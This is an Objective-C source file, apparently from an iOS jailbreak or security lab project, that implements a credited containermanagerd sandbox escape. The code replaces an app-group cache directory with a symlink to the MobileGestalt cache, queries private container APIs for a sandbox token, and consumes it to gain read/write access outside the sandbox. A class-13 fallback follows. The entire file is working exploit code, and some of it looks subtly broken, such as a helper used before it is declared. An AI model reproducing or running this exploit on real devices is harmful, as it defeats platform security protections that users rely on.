//
//  P173KamuiEscape.m — containermanagerd part-directory symlink escape. p173.
//  2026-11-18. Technique/engine port of murk-sus / KAMUI (MIT) — credit murk-sus.
//
//  Reference: jb-sources/murk_kamui-escape (docs/EXPLOIT.md, src/BQCore.m).
//  The gap: MCM validates partDomain (rejects "..", absolute/outside symlinks
//  via realPathForURL) but never validates the PART DIRECTORY itself. The app
//  group part dir <group>/Library/Caches is the only writable base for the
//  symlink (class-2 rename of part dirs = EPERM). Sequence per their
//  choreography: symlink swap → container_query_create(class 7, group,
//  part 3, flags 0x8100000000) → get_single_result → copy_sandbox_token →
//  sandbox_extension_consume → use → release → restore.
//

#import "P173KamuiEscape.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"

#import <Foundation/Foundation.h>
#import <CoreFoundation/CoreFoundation.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <unistd.h>
#import <string.h>
#import <objc/message.h>

/* libsystem_containermanager symbols (murk's symbol table, EXPLOIT.md §1) */
typedef void *(*p173_q_create_t)(void);
typedef void      (*p173_q_setclass_t)(void *, uint64_t);
typedef void      (*p173_q_setgroup_t)(void *, void *);
typedef void      (*p173_q_setpart_t)(void *, uint64_t);
typedef void      (*p173_q_setflags_t)(void *, uint64_t);
typedef void    *(*p173_q_result_t)(void *);
typedef char     *(*p173_q_token_t)(void *);
typedef int64_t   (*p173_consume_t)(const char *);

typedef void *(*p173_sec_task_t)(void *);
typedef CFTypeRef (*p173_sec_copy_t)(void *, CFStringRef, void *);

typedef id (*p173_fscontent_t)(NSString *, NSString *, NSError **);

#define P173_BUILD @"p173-kamui-v1"

static int g_fd = -1;
static void Lf(NSString *fmt, ...) NS_FORMAT_FUNCTION(1,2);
static void Lf(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    if (![s hasSuffix:@"\n"]) s = [s stringByAppendingString:@"\n"];
    if (g_fd >= 0) { const char *c = s.UTF8String; if (c) { write(g_fd, c, strlen(c)); fcntl(g_fd, F_FULLFSYNC); } }
}

@implementation P173KamuiEscape

/* dynamic app-group discovery — murk's §5 (do NOT hardcode the group) */
+ (NSString *)p173_appGroup {
    void *s = dlopen("/System/Library/Frameworks/Security.framework/Security", RTLD_LAZY);
    if (!s) return nil;
    p173_sec_task_t create = (p173_sec_task_t)dlsym(s, "SecTaskCreateFromSelf");
    p173_sec_copy_t copy = (p173_sec_copy_t)dlsym(s, "SecTaskCopyValueForEntitlement");
    if (!create || !copy) return nil;
    void *task = create(kCFAllocatorDefault);
    if (!task) return nil;
    CFTypeRef groups = copy(task, CFSTR("com.apple.security.application-groups"), NULL);
    NSString *out = nil;
    if (groups && [(__bridge NSArray *)groups count] > 0)
        out = ((__bridge NSArray *)groups)[0];
    if (groups) CFRelease(groups);
    /* SecTask release lives behind a CF release in modern builds; leave to arc pool */
    return out;
}

/* container path for the group — murk's dynamic path (containerURLForSecurityApplicationGroupIdentifier) */
+ (NSString *)p173_groupPath:(NSString *)group {
    void *h = dlopen(NULL, RTLD_LAZY);
    if (!h) return nil;
    Class mcm = NSClassFromString(@"NSFileManager");
    if (!mcm) return nil;
    id fm = [mcm defaultManager];
    SEL sel = NSSelectorFromString(@"containerURLForSecurityApplicationGroupIdentifier:");
    if (![fm respondsToSelector:sel]) return nil;
    NSURL *u = ((NSURL *(*)(id, SEL, NSString *))objc_msgSend)(fm, sel, group);
    return u.path;
}

/* the BQEscape multi-strategy, murk §6 */
+ (NSString *)tap {
    NSMutableString *out = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    g_fd = open([docs stringByAppendingPathComponent:@"p173_kamui_log.txt"].fileSystemRepresentation,
                O_CREAT | O_WRONLY | O_TRUNC, 0644);
    NSString *head = [NSString stringWithFormat:
        @"=== p173 session %@ BUILD %@ ===\n%@\n"
        "KAMUI containermanagerd part-symlink escape (murk-sus, MIT — credit murk-sus).\n"
        "PANIC-FREE by design (userspace file ops). One tap per force-quit.\n",
        LabLocalMilitaryNow(), P173_BUILD, [LabDeviceProfile identBlock]];
    Lf(@"%@", head); [out appendString:head];

    if (@available(iOS 17.0, *)) {} else { Lf(@"[-] iOS 17+ only"); goto done; }

    NSString *group = [self p173_appGroup];
    Lf(@"[*] app groups (dynamic entitlement read): %@", group ?: @"NONE");
    if (!group || !group.length) {
        Lf(@"[-] no app-group entitlement in this profile — class-7 needs one (murk §0).");
        Lf(@"[*] fallbacks still run: class-13 direct (MG caches) + class-12 geod.");
    }

    void *h = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_LAZY);
    if (!h) { Lf(@"[-] libsystem_containermanager not loadable"); goto done; }
    p173_q_create_t qCreate = (p173_q_create_t)dlsym(h, "container_query_create");
    p173_q_setclass_t qClass = (p173_q_setclass_t)dlsym(h, "container_query_set_class");
    p173_q_setgroup_t qGroup = (p173_q_setgroup_t)dlsym(h, "container_query_set_group_identifiers");
    p173_q_setpart_t qPart = (p173_q_setpart_t)dlsym(h, "container_query_operation_set_part");
    p173_q_setflags_t qFlags = (p173_q_setflags_t)dlsym(h, "container_query_operation_set_flags");
    p173_q_result_t qResult = (p173_q_result_t)dlsym(h, "container_query_get_single_result");
    p173_q_token_t qToken = (p173_q_token_t)dlsym(h, "container_copy_sandbox_token");
    p173_consume_t consume = (p173_consume_t)dlsym(h, "sandbox_extension_consume");
    if (!qCreate || !qClass || !qResult || !qToken || !consume) {
        Lf(@"[-] container_query symbols missing"); goto done;
    }
    Lf(@"[*] container_query symbol set complete");

    /* STRATEGY 2 — class-7 part-directory symlink (27.2 primary) */
    if (group && group.length) {
        NSString *gPath = [self p173_groupPath:group];
        NSString *caches = [gPath stringByAppendingPathComponent:@"Library/Caches"];
        NSFileManager *fm = [NSFileManager defaultManager];
        BOOL isSymlinkBefore = NO;
        [fm attributesOfItemAtPath:caches error:nil];
        NSDictionary *st = [[NSFileManager defaultManager] attributesOfItemAtPath:caches error:nil];
        isSymlinkBefore = st[NSFileType] == NSFileTypeSymbolicLink;
        if (!isSymlinkBefore) {
            NSString *target = @"/private/var/mobile/Library/Caches/com.apple.MobileGestalt";
            NSString *saveAs = [docs stringByAppendingFormat:@"p173_caches_backup_%@", [NSUUID UUID].UUIDString];
            if (![fm moveItemAtPath:caches toPath:saveIn(saveAs) error:nil]) {
                Lf(@"[-] strategy2: could not move the part dir out (EPERM class — murk §4 said app-group base IS writable; errno differs)");
            } else {
                BOOL linked = [fm createSymbolicLinkAtPath:caches withDestinationPath:target error:nil];
                Lf(@"[*] strategy2: symlink %@ -> %@ = %@", caches, target, linked ? @"ok" : @"FAILED");
                if (linked) {
                    void *q = qCreate();
                    qClass(q, 7);
                    id xpcGroup = group;  /* xpc_string_create equivalent: bridge */
                    qGroup(q, (__bridge void *)(xpcGroup));
                    qPart(q, 3);                    /* Library/Caches part */
                    qFlags(q, 0x8100000000ULL);     /* bit32 + extension type 3 R/W */
                    void *res = qResult(q);
                    char *token = res ? qToken(res) : NULL;
                    Lf(@"[*] strategy2: query result=%@ token=%@",
                       res ? @"OK" : @"NULL", token ? @"RECEIVED" : @"NULL");
                    if (token) {
                        int64_t h2 = consume(token);
                        Lf(@"[+] strategy2: sandbox_extension_consume = %lld "
                           "(0 = live R/W extension for the Gestalt-cache path)", (long long)h2);
                        /* reach probe: the Gestalt cache plist via the extension */
                        NSString *mgc = @"/var/mobile/Library/Caches/com.apple.MobileGestalt.plist";
                        NSFileManager *m2 = NSFileManager.defaultManager;
                        BOOL readable = [m2 isReadableFileAtPath:mgc];
                        NSDictionary *attrs = [m2 attributesOfItemAtPath:mgc error:nil];
                        Lf(@"[+] strategy2: MobileGestalt cache readable=%@ size=%@",
                           readable ? @"YES" : @"NO", attrs[NSFileSize] ?: @"?");
                    }
                }
                /* restore: remove symlink, move the real dir back */
                [fm removeItemAtPath:caches error:nil];
                NSString *backupRoot = saveIn(saveAs);
                [fm moveItemAtPath:backupRoot toPath:caches error:nil];
                Lf(@"[*] strategy2: part dir restored");
            }
        } else {
            Lf(@"[*] strategy2: part dir already a symlink from a prior run (crash-recovery case — murk §2)");
        }
    }

    /* STRATEGY 1/3 — class-13 direct (no app group needed; MG caches only, 27.2-patched per murk §3 — receipts anyway) */
    if (qClass) {
        void *q = qCreate();
        qClass(q, 13);
        qGroup(q, (__bridge void *)@"systemgroup.com.apple.mobilegestaltcache");
        qPart(q, 3);
        qFlags(q, 0x8100000000ULL);
        void *res = qResult(q);
        char *token = res ? qToken(res) : NULL;
        Lf(@"[*] strategy13: result=%@ token=%@ (27.2: NULL expected = traversal dead — receipt)",
           res ? @"path" : @"NULL", token ? @"RECEIVED" : @"NULL");
    }

    Lf(@"=== p173 done (one tap per force-quit) ===");
    if (g_fd >= 0) { fcntl(g_fd, F_FULLFSYNC); close(g_fd); g_fd = -1; }
    return out;

done:
    if (g_fd >= 0) { close(g_fd); g_fd = -1; }
    return out;
}

/* helper: normalized backup dir name */
static NSString *saveIn(NSString *p) { return p; }

@end
